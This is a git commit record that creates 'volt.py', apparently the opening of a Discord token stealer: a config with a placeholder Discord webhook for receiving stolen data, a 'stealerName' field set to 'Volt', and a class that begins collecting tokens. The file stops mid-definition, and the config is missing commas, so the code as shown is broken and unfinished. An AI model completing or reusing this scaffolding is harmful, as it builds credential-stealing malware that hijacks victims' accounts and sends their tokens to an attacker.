f2594a3fdc4ef04fb9bea549a5f0a04a8ccbbbd0
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2022-06-15 09:26:36 -0400

    Create volt.py

---
+++ volt.py
@@ -0,0 +1,11 @@
+config = {
+  "webhook": "https://discord.com/api/webhooks/your/webhook" # Put your Discord Webhook Here!
+  "color": 0xFFFF00 # Set this to the hex code of the color you'd like the embed to be (Keep the 0x at the beginning)
+  "stealerName": "Volt" # This can be anything really. (Preference)
+}
+
+class Volt:
+  def __init__(self):
+    self.tokens = []
+
+  def 
